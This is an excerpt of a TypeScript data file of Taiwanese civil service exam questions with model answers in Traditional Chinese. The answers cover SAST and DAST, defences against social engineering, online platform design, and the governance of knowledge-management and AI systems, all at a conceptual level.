+          <section class="answer-block"><h3>技術原理比較</h3><div class="table-wrap"><table><thead><tr><th>項目</th><th>SAST</th><th>DAST</th></tr></thead><tbody><tr><td>分析對象</td><td>原始碼、位元碼或二進位檔。</td><td>執行中的網站、API 或應用程式。</td></tr><tr><td>測試方式</td><td>不執行程式，分析資料流、控制流、危險函式與不安全寫法。</td><td>從外部送出請求，模擬攻擊並觀察實際回應。</td></tr><tr><td>可發現問題</td><td>硬編碼密碼、不安全輸入處理、SQL Injection 或 XSS 風險、危險 API 使用。</td><td>認證繞過、錯誤設定、實際可利用弱點、伺服器錯誤回應與部署風險。</td></tr><tr><td>優點</td><td>可在開發早期發現問題，且能定位到程式碼位置。</td><td>貼近真實攻擊情境，能驗證漏洞在實際環境是否存在。</td></tr><tr><td>限制</td><td>可能誤報，且無法完整反映部署環境。</td><td>較難指出精確程式碼位置，也可能漏掉未被觸發的程式路徑。</td></tr></tbody></table></div></section>
+          <section class="answer-block"><h3>為何必須互補</h3><p>SAST 是從內部看程式碼，適合在開發早期找出設計與實作缺陷；DAST 是從外部看執行中的系統，適合驗證部署後的真實攻擊面。只做 SAST 可能忽略伺服器設定、驗證流程、環境差異與實際可利用性；只做 DAST 則可能無法涵蓋所有程式分支，也難以追到根本程式碼位置。</p><p>因此完整的資安檢測流程應在 SDLC 中搭配使用兩者：開發階段以 SAST 早期修補，測試或上線前以 DAST 驗證實際風險，並將結果回饋給開發團隊改善程式與部署設定。</p></section>`
+  },
+  {
+    "id": 77,
+    "slug": "question-77",
+    "title": "社交工程攻擊技術與防範",
+    "points": "25 分",
+    "year": "115年",
+    "examName": "移民行政人員考試",
+    "grade": "三等考試",
+    "category": "移民行政類科資訊組",
+    "subject": "資通訊及網路安全",
+    "subjectSlug": "115-immigration-third-information-communication-network-security",
+    "order": "四",
+    "html": `<div class="question-head"><span class="number">四</span><div><h2>社交工程攻擊技術與防範</h2><p>配分 25 分</p></div></div>
+          <section class="prompt-block"><h3>題目</h3><p>請列舉說明五項社交工程攻擊技術，並分述防範之道。</p></section>
+          <section class="answer-block"><h3>常見攻擊技術與防範</h3><div class="table-wrap"><table><thead><tr><th>攻擊技術</th><th>說明</th><th>防範之道</th></tr></thead><tbody><tr><td>釣魚郵件 Phishing</td><td>偽裝成銀行、政府機關、公司通知或系統警示，誘使使用者點擊連結、下載附件或輸入帳密。</td><td>部署郵件過濾與惡意連結檢測，啟用多因素驗證，教育員工辨識寄件者、網址與可疑附件。</td></tr><tr><td>魚叉式釣魚 Spear Phishing</td><td>針對特定個人或單位客製化內容，例如假冒主管要求匯款或假冒 IT 人員要求重設密碼。</td><td>敏感操作採雙人覆核與第二管道確認，限制公開組織資訊，定期演練高風險情境。</td></tr><tr><td>電話詐騙 Vishing</td><td>透過電話假冒客服、主管、稽核或技術支援，要求提供密碼、驗證碼或執行遠端操作。</td><td>不得透過電話提供密碼或一次性驗證碼，建立來電查證程序，異常要求應掛斷後撥打官方電話確認。</td></tr><tr><td>誘餌攻擊 Baiting</td><td>以惡意 USB、免費軟體、破解工具或誘人檔案吸引使用者開啟，進而植入惡意程式。</td><td>禁止使用不明 USB 與未授權軟體，端點啟用裝置控管、防毒與 EDR，落實軟體白名單。</td></tr><tr><td>尾隨進入 Tailgating</td><td>攻擊者跟隨合法員工進入管制區域，可能假裝忘帶識別證、搬運物品或拜訪人員。</td><td>落實一人一卡、訪客登記與識別證制度，員工不替陌生人開門，重要區域加強監視與警衛巡查。</td></tr></tbody></table></div></section>
+          <section class="answer-block"><h3>整體防護觀念</h3><p>社交工程攻擊利用人的信任、恐懼、好奇或服從心理，因此防範不能只依賴技術工具。組織應結合安全教育、權限最小化、MFA、端點控管、異常通報流程、敏感作業覆核與定期演練，降低人員被誘騙後造成的實際損害。</p></section>`
+  },
+  {
+    "id": 80,
+    "slug": "question-80",
+    "title": "線上申辦平台需求分析、測試驗收與維護",
+    "points": "25 分",
+    "year": "115年",
+    "examName": "移民行政人員考試",
+    "grade": "三等考試",
+    "category": "移民行政類科資訊組",
+    "subject": "資訊管理與應用",
+    "subjectSlug": "115-immigration-third-information-management-application",
+    "order": "一",
+    "html": `<div class="question-head"><span class="number">一</span><div><h2>線上申辦平台需求分析、測試驗收與維護</h2><p>配分 25 分</p></div></div>
+          <section class="prompt-block"><h3>題目</h3><p>內政部移民署計劃建立線上申辦平台，提供民眾線上提出申請、查詢案件進度等，而署內承辦人員亦可透過後台進行案件審核。請從系統分析與設計角度說明需求蒐集、現行流程盤查與未來流程規劃，包括功能需求、非功能需求與角色權限；並說明上線前測試、驗收條件、資訊安全與個人資料保護查核機制，以及上線後維護機制。</p></section>
+          <section class="answer-block"><h3>需求蒐集與 As-Is 盤查</h3><p>此平台同時服務民眾與機關內部承辦人，因此需求蒐集不能只訪談資訊單位，應納入業務單位、櫃檯人員、審核承辦人、主管、客服、資安與個資保護窗口，以及實際申辦民眾或代理人。可採用訪談、工作坊、問卷、現場觀察、既有表單與法規盤點、客服紀錄分析、系統日誌分析等方法，整理使用者旅程與業務痛點。</p><p>As-Is 流程盤查應先畫出現行申辦流程，包括民眾取得表單、填寫資料、臨櫃或郵寄送件、補件通知、承辦分案、資格審查、主管核定、結果通知、歸檔與統計報表。每個步驟需記錄輸入資料、產出文件、使用系統、人工判斷點、法定期限、常見退件原因、個資流向與跨單位介接。如此才能辨識重複輸入、紙本傳遞、狀態不透明、人工查詢耗時、缺乏稽核軌跡等問題。</p></section>
+          <section class="answer-block"><h3>To-Be 流程、功能需求與角色權限</h3><p>To-Be 流程應以線上化、流程透明、資料一次輸入、後台分工審核與全程留痕為原則。民眾可登入身分驗證、選擇申辦項目、線上填表、上傳附件、繳費、送出申請、接收補件通知、查詢進度與下載結果。承辦人可在後台收件、分案、檢核附件、要求補件、審查案件、註記審核意見、送主管核定、發送通知與產製統計報表。主管可審核、退回、核准、查詢績效與逾期案件。</p><p>功能需求可分為前台申辦、身分驗證、案件管理、文件上傳、線上繳費、通知服務、後台審核、報表統計、系統管理、介接服務與稽核紀錄。非功能需求則包括可用性、效能、資安、個資保護、可維護性、無障礙、相容性、備援復原、日誌保存與法規遵循。例如尖峰時段仍需維持合理回應時間，附件上傳需防毒與格式檢查，個資欄位需加密或遮罩，系統需支援身分驗證與多因素驗證。</p><p>角色權限應採最小權限與職務分工原則。民眾只能查看與修改自己的草稿或案件；代理人需有授權紀錄；承辦人只能處理分派案件；主管可審核所屬單位案件；系統管理員負責帳號、流程與參數設定，但不得任意查看業務內容；稽核人員可查詢操作紀錄但不可修改案件。權限模型應支援角色基礎存取控制、資料範圍限制、敏感操作雙人覆核與完整稽核軌跡。</p></section>
+          <section class="answer-block"><h3>測試、驗收與資安個資查核</h3><p>上線前應完成單元測試、整合測試、系統測試、使用者驗收測試、效能壓力測試、資安測試、備份還原演練、災害復原演練、無障礙與跨瀏覽器測試。驗收條件可包含：主要申辦流程可成功完成，錯誤與補件情境可正確處理，案件狀態與通知一致，報表數字可追溯，權限控管符合職務分工，尖峰負載下回應時間與可用性達標，資安弱點已修補，個資蒐集、處理、利用符合告知與目的限制。</p><p>資訊安全查核應包含原始碼檢測、弱點掃描、滲透測試、身分驗證檢查、權限繞越測試、上傳檔案安全檢查、日誌與異常告警檢查、加密傳輸與憑證設定檢查。個資保護查核應確認蒐集欄位具必要性、告知事項完整、敏感資料有遮罩與加密、資料保存期限明確、下載與匯出有紀錄、測試資料去識別化、委外廠商有保密與資安責任、個資事故通報流程可執行。</p></section>
+          <section class="answer-block"><h3>上線後維護機制</h3><p>上線後應建立維運窗口、事件分級、服務水準協議、監控儀表板、定期備份、弱點修補、版本更新、客服回饋處理與需求變更管理。應持續監控系統效能、錯誤率、登入失敗、異常查詢、逾期案件、通知失敗與資安告警。重大功能調整需經需求評估、測試環境驗證、上線排程、回復計畫與使用者公告。對法規變動、表單欄位調整與流程變更，也要有參數化或版本化管理，以降低維護成本。</p></section>`
+  },
+  {
+    "id": 81,
+    "slug": "question-81",
+    "title": "知識管理系統與生成式 AI 導入注意事項",
+    "points": "25 分",
+    "year": "115年",
+    "examName": "移民行政人員考試",
+    "grade": "三等考試",
+    "category": "移民行政類科資訊組",
+    "subject": "資訊管理與應用",
+    "subjectSlug": "115-immigration-third-information-management-application",
+    "order": "二",
+    "html": `<div class="question-head"><span class="number">二</span><div><h2>知識管理系統與生成式 AI 導入注意事項</h2><p>配分 25 分</p></div></div>
+          <section class="prompt-block"><h3>題目</h3><p>請說明組織導入知識管理系統時，應具備哪些核心功能以支援知識蒐集、分類、儲存、查詢、分享、更新與版本管理；若進一步導入生成式 AI 輔助內部知識查詢與客服回覆，請說明資料品質、回覆正確性、個人資料保護、人工覆核與權責分工應注意事項。</p></section>
+          <section class="answer-block"><h3>KMS 核心功能</h3><p>知識管理系統的目標，是把分散在文件、信箱、系統、表單、會議紀錄與人員經驗中的知識，轉換成可保存、可搜尋、可分享、可維護的組織資產。核心功能應涵蓋知識蒐集、分類、儲存、檢索、分享、更新、版本與權限管理。</p><ul><li><strong>知識蒐集：</strong>支援文件上傳、網頁編輯、表單化輸入、FAQ 建立、案例紀錄、會議紀錄匯入、外部法規連結與系統資料介接。</li><li><strong>分類與標籤：</strong>以主題、業務類別、適用對象、法規依據、有效日期、機密等級、關鍵字與責任單位建立分類架構。</li><li><strong>儲存與全文檢索：</strong>支援全文搜尋、進階篩選、同義詞、熱門查詢、關聯文件推薦與附件內容索引。</li><li><strong>分享與協作：</strong>提供留言、訂閱、收藏、推薦、權限分享、知識社群與通知機制，促進跨單位知識流通。</li><li><strong>更新與審核：</strong>建立草稿、審核、發布、到期提醒、定期複核、失效下架與責任人制度，避免知識過期。</li><li><strong>版本管理：</strong>保留版本差異、修改者、修改時間、審核紀錄與回復機制，確保知識可追溯。</li><li><strong>權限與稽核：</strong>依角色、單位、機密等級限制檢視與編修，並保存查詢、下載、修改與刪除紀錄。</li></ul></section>
+          <section class="answer-block"><h3>導入生成式 AI 的資料品質與正確性</h3><p>若 KMS 導入生成式 AI，可用於自然語言查詢、摘要、客服草稿、法規問答與知識推薦，但前提是資料品質要可控。應先清理重複、過期、矛盾、來源不明與格式不一致的知識，為每筆資料加上來源、版本、有效日期、責任單位與可信等級。對法律、權益、費用、資格條件等高風險內容，應引用正式文件或法規條文，避免模型依不完整資料自行推論。</p><p>回覆正確性方面，建議採用檢索增強生成，也就是先從 KMS 找出相關文件，再由 AI 依引用內容產生答案。回覆應附來源連結、文件版本與更新日期，並在信心不足或查無依據時明確回覆無法判斷，而不是猜測。系統也應設計禁答範圍、敏感詞檢查、回覆品質抽驗、錯誤回報與知識修正流程。</p></section>
+          <section class="answer-block"><h3>個資保護、人工覆核與權責分工</h3><p>個人資料保護上，KMS 與 AI 查詢不應把民眾姓名、身分證字號、聯絡方式、案件內容等個資不必要地送入模型。應採資料最小化、去識別化、遮罩、存取控管、加密傳輸、日誌保存與外部模型服務合約審查。若使用雲端或外部 AI 服務，必須確認資料是否用於訓練、保存多久、是否跨境傳輸、是否可刪除，以及是否符合機關資安與個資規範。</p><p>人工覆核方面，AI 可作為草稿與輔助查詢，不宜直接取代承辦判斷。涉及人民權益、行政處分、法規解釋、申辦資格與客服正式回覆時，應由承辦人或主管確認後發布。權責分工可設計為：知識擁有單位負責內容正確與更新；資訊單位負責系統維運與資安；資安與個資窗口負責合規查核；客服或業務單位負責回覆品質；主管負責高風險回覆審核；稽核單位定期檢視使用紀錄與錯誤案例。</p></section>`
+  },
+  {
+    "id": 82,
+    "slug": "question-82",
+    "title": "系統取得方式比較與行動雲端客服治理",
+    "points": "25 分",
+    "year": "115年",
+    "examName": "移民行政人員考試",
+    "grade": "三等考試",
+    "category": "移民行政類科資訊組",
+    "subject": "資訊管理與應用",
+    "subjectSlug": "115-immigration-third-information-management-application",
+    "order": "三",
+    "html": `<div class="question-head"><span class="number">三</span><div><h2>系統取得方式比較與行動雲端客服治理</h2><p>配分 25 分</p></div></div>
+          <section class="prompt-block"><h3>題目</h3><p>某中型組織準備汰換既有資訊系統，並希望新增行動服務與線上客服功能。請比較自行開發、委外開發、套裝軟體或雲端服務在成本、時程、彈性、維護、資安與組織配合等面向的優點與限制；並說明導入行動服務與雲端智慧客服系統時，如何從技術、法規與資訊倫理面確保服務品質、資訊安全、個人資料保護及資料合理使用。</p></section>
+          <section class="answer-block"><h3>系統取得方式比較</h3><table><thead><tr><th>面向</th><th>自行開發</th><th>委外開發</th><th>套裝軟體或雲端服務</th></tr></thead><tbody><tr><td>成本</td><td>需投入內部人力、開發工具、測試與維運成本，初期負擔較高，但長期可掌握技術資產。</td><td>初期可用契約控管費用，但需求變更、維護與擴充常產生追加成本。</td><td>初期導入成本較低，採授權或訂閱付費，但長期授權、用量與資料搬遷成本需評估。</td></tr><tr><td>時程</td><td>若內部熟悉業務與技術可快速調整，但大型系統開發期較長。</td><td>可利用廠商經驗縮短開發，但需求確認、驗收與溝通會影響時程。</td><td>標準功能可快速上線，客製化與資料轉換可能拉長導入時間。</td></tr><tr><td>彈性</td><td>最能貼近特殊流程，修改彈性高。</td><td>可客製，但受契約、廠商能力與文件品質限制。</td><td>標準化程度高，彈性受產品架構與 API 限制。</td></tr><tr><td>維護</td><td>需有內部技術能力，否則人員異動會造成風險。</td><td>維護可委由廠商，但可能形成廠商鎖定。</td><td>供應商負責平台更新與基礎設施，但組織需管理設定、權限、資料與合約。</td></tr><tr><td>資安</td><td>可自行掌握架構與資料，但也必須自行負責弱點修補與監控。</td><td>需在契約中規範原始碼、弱掃、滲測、保密與事件通報責任。</td><td>需審查供應商資安認證、資料所在地、備援、加密、存取紀錄與服務可用性。</td></tr><tr><td>組織配合</td><td>需業務與資訊人員深度投入，適合有成熟資訊團隊者。</td><td>需建立需求窗口與變更管理，避免業務與廠商認知落差。</td><td>常需調整內部流程以配合產品標準，組織變革與教育訓練很重要。</td></tr></tbody></table></section>
+          <section class="answer-block"><h3>導入行動服務與雲端智慧客服的治理</h3><p>技術面應確保服務可用、穩定、安全且可監控。行動服務需採響應式設計或原生 App，支援身分驗證、多因素驗證、裝置安全檢查、傳輸加密、API 權限控管、憑證釘選、輸入驗證與敏感資料不落地。雲端客服需整合知識庫、工單系統與人工客服，提供服務監控、流量控管、異常告警、備援、備份與災害復原。AI 回覆應保留對話紀錄、來源引用、信心分數與轉人工機制。</p><p>法規面需遵守個人資料保護、資通安全、政府或產業主管機關規範、委外管理與雲端服務契約要求。個資蒐集應有明確目的與告知，僅蒐集必要資料，限制使用範圍與保存期限，並提供查詢、更正、刪除或停止利用的程序。若客服資料含個資或敏感內容，應進行遮罩、去識別化、權限分級、加密保存與存取稽核。</p><p>資訊倫理方面，應避免把 AI 客服包裝成真人而誤導使用者，應告知使用者其正在與 AI 互動。不得將民眾資料用於與申辦目的無關的分析或商業用途；不得讓模型以偏見、歧視或未經證實的內容回覆。對可能影響權益的答案，應提示以正式公告或承辦人確認為準，並提供申訴、轉人工與錯誤更正管道。</p></section>`
+  },
+  {
+    "id": 83,
+    "slug": "question-83",
+    "title": "跨單位資料平台與 AI 預警模型治理",
+    "points": "25 分",
+    "year": "115年",
+    "examName": "移民行政人員考試",
+    "grade": "三等考試",
+    "category": "移民行政類科資訊組",
+    "subject": "資訊管理與應用",
+    "subjectSlug": "115-immigration-third-information-management-application",
+    "order": "四",
+    "html": `<div class="question-head"><span class="number">四</span><div><h2>跨單位資料平台與 AI 預警模型治理</h2><p>配分 25 分</p></div></div>
+          <section class="prompt-block"><h3>題目</h3><p>請說明跨單位資料平台在組織管理與決策支援上可發揮哪些功能，並說明建置時應如何確保資料品質、資料一致性、權限控管與資料共享合理性。若平台進一步導入 AI 預警模型，請說明可能效益，以及組織在資料偏誤、模型誤判、可解釋性、責任歸屬與民眾權益保障方面應建立哪些管理配套。</p></section>
+          <section class="answer-block"><h3>平台功能與資料治理</h3><p>跨單位資料平台可把不同部門、不同系統、不同格式的資料整合成可管理、可查詢、可分析的共同資料資產。在組織管理上，它可支援資料共享、流程協同、案件追蹤、績效管理、資源配置與風險監控。在決策支援上，它可提供儀表板、趨勢分析、地理資訊分析、異常偵測、預測分析、政策成效評估與高風險案件篩選。</p><p>資料品質需從來源端開始管理，包括資料標準、欄位定義、格式規則、必填檢核、重複資料比對、錯誤資料回報、資料更新頻率與品質指標。平台應建立資料目錄、資料字典、主資料管理與資料血緣，讓使用者知道資料來源、更新時間、定義、限制與責任單位。</p><p>資料一致性可透過共同代碼、統一識別碼、資料轉換規則、版本控管、同步機制與跨系統對帳來確保。權限控管應採最小權限、角色分級、資料分級、欄位遮罩與用途限制。資料共享必須確認法源依據、業務必要性、使用目的、資料範圍、保存期限、再利用限制與稽核方式。</p></section>
+          <section class="answer-block"><h3>AI 預警模型效益與管理配套</h3><p>導入 AI 預警模型後，可從大量資料中找出人力難以即時辨識的異常與趨勢，例如案件逾期風險、重複申請、文件異常、服務量暴增、資源不足、潛在違規樣態或高風險事件。模型可協助主管提早配置人力、優先處理高風險案件、改善流程瓶頸、降低錯誤與縮短反應時間。其定位應是輔助判斷與預警，而非自動作成行政處分。</p><p>資料偏誤方面，模型訓練資料若反映歷史偏差、特定族群樣本不足或來源資料品質不佳，可能導致不公平預警。因此應進行資料代表性檢查、偏誤測試、特徵合理性審查、定期再訓練與模型監控。不得使用與業務目的無關或可能造成歧視的敏感特徵。</p><p>模型誤判方面，應設定人工複核、申訴更正、錯誤案例回饋與風險分級機制。AI 預警只能提示承辦人注意，不能單憑模型分數拒絕申請或作成不利處分。可解釋性方面，系統應提供主要影響因素、資料來源、模型版本、預警時間與處理紀錄，讓承辦人能理解並向民眾說明。</p><p>責任歸屬方面，組織需明確規範資料提供單位、模型開發單位、系統維運單位、業務使用單位與決策主管的責任。民眾權益保障方面，應建立告知、查詢、更正、人工審查、申訴與救濟機制，並定期由資安、法制、個資保護與外部稽核檢視模型使用是否符合比例原則、目的限制與公平性要求。</p></section>`
   }
 ] satisfies ExamQuestion[];
 
